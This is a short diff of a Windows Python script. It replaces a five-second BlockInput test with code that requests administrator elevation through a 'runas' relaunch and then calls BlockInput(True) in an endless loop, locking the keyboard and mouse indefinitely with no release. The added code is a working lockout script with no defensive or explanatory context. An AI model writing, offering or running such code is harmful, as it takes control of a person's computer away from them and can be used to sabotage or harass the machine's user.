@@ -1,10 +1,14 @@
 from ctypes import *
-import time
-
-print(cdll.shell32.IsUserAnAdmin())  # Determine whether you have administrator rights
-
-user32 = windll.LoadLibrary("C:\\Windows\\System32\\user32.dll")
-user32.BlockInput(True)  # This function requires administrator privileges True to disable
-time.sleep(5)
-user32.BlockInput(False)  # This function requires administrator privileges
-time.sleep(5)
+import ctypes, sys
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+if is_admin():
+    # Code of your program here
+    while(True):
+        windll.user32.BlockInput(True)
+else:
+    # Re-run the program with admin rights
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
